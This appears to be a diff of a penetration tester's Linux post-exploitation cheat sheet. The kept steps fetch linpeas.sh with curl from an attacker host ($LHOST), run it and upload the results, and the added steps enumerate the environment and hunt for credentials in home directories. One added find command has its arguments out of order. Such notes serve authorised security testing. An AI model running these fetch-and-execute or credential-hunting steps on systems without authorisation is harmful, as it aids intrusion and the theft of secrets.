@@ -1,21 +1,8 @@
-## Stabilize shell
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-stty raw -echo; fg; export TERM=xterm
-```
-
+# Automated Enumeration
 ## linPEAS collection and parsing
 
-Primary workflow:
-- download `linpeas.sh` to target
-- run it and save raw output locally
-- upload the raw output back to Kali
-- parse it there if needed
-
-Download and run:
+Download, run, and upload to workstation for review:
 ```bash
-LHOST=<LHOST or already exported>
-mkdir -p /tmp/working
 curl "http://$LHOST/linpeas.sh" -o /tmp/working/linpeas.sh
 chmod +x /tmp/working/linpeas.sh
 bash /tmp/working/linpeas.sh | tee /tmp/working/linpeas.out
@@ -39,6 +26,7 @@ Parsers:
 - [ParsingPeas](https://github.com/YuvalMil/ParsingPeas)
 - [parsePEASS](https://github.com/mnemonic-re/parsePEASS)
 
+# Situational Awareness
 ## Show current user and host
 ```bash
 id
@@ -47,10 +35,14 @@ uname -a
 cat /etc/os-release
 ```
 
+## Print Environment Variables
+```
+env
+```
+
 ## Check sudo
 ```bash
 sudo -l
-sudo -l | grep LD_PRELOAD
 ```
 
 ## Show processes and listening ports
@@ -61,15 +53,20 @@ ip a
 ip route
 ```
 
-## Expose a localhost-only service immediately
-```bash
-ssh -L 3306:127.0.0.1:3306 user@<target>
-ssh -L 8080:127.0.0.1:8080 user@<target>
-```
-
 ## Watch short-lived processes with pspy
 ```bash
 ./pspy64
+```
+
+# Credential Hunting
+
+## Search for interesting files/folders
+```
+ls -al /home/users
+
+find -type f /home/users 2>/dev/null
+
+ls -al /opt /var /tmp
 ```
 
 ## Check bash history and keys
